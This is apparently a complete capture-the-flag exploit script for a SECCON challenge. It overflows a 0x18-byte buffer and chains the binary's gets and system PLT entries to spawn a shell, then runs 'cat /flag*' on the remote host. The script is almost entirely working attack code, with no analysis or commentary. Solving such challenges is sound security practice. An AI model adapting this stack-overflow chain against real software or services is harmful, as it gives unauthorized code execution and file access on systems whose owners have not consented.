from ptrlib import *
import os

HOST = os.getenv("SECCON_HOST", "localhost")
PORT = int(os.getenv("SECCON_PORT", "9999"))

elf = ELF("./chall")
sock = Socket(HOST, PORT)

payload  = b"A"*0x18
payload += flat([
    elf.plt("gets"),
    elf.plt("system")
], map=p64)
sock.sendlineafter(":\n", payload)

sock.sendline("/bin0sh")

sock.sendline("cat /flag*")
print(sock.recvline())
sock.close()
